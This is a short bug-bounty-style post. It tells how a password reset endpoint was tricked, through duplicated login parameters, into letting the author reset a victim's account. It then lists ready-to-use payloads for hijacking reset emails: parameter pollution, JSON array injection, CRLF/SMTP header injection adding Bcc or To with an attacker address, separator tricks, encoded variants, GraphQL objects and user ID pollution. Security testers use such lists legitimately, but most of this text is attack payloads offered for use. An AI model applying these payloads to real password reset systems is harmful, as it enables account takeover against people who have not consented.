Bug Bounty Trick – Account Takeover with Password Reset I sent a request to a password reset endpoint on a system like this: 

login= victim@mail.com&login=mine@mail.com 

And guess what? A reset link was sent to both emails. But the weird thing is: the system only takes into account 
the first login parameter and associates token generation with the attacker's email account.
In other words, the link goes to the victim's email,
but my email manages the session. Result? I can reset the victim's account.
🙃 Sometimes just one parameter difference can bring down the entire system.
😉 Let me leave you with a few parameter manipulation techniques that I actively use;

## 1. Parameter Pollution: 

```
email=victim@mail.com&email=hacker@mail.com
email=attacker@mail.com&email=victim@mail.com 
```

## 2. JSON Array Injection 

```
email=["victim@mail.com","hacker@mail.com"] 
email=["attacker@mail.com","victim@mail.com"]
```

## 3. Carbon Copy (BCC abuse / Header Injection) 

```
email=victim@mail.com%0Abcc:attacker@mail.com 
email=victim@mail.com%0Ato:attacker@mail.com 
email=victim@mail.com %0ACc:attacker@mail.com
```

## 4. Separators 

```
email=victim@mail.com,attacker@mail.com
email=victim@mail.com attacker@mail.com 
email=victim@mail.com|attacker@mail.com 
email=victim@mail.com;attacker@mail.com
email=victim@mail.com///attacker@mail.com
```

## 5. Encoded Trick Variants 

```
email=victim%40mail.com&email=attacker%40mail.com
email=%22victim@mail.com%22%2C%22attacker@mail.com%22 
email=%5B%22victim@mail.com%22%2C%22attacker@mail.com%22%5D 
```

## 6. Injection inside objects (for GraphQL / JSON APIs) 
```
{"user": { "email": [" victim@mail.com ", " attacker@mail.com "] } }
```

## 7. Header Manipulation (SMTP Abuse)

```
email=victim@mail.com%0D%0ABcc:attacker@mail.com
email=victim@mail.com%0D%0ATo:attacker@mail.com
```

## 8. ID-based manipulation (eğer sistem e-posta yerine ID alıyorsa)

```
user_id=123&user_id=456
```

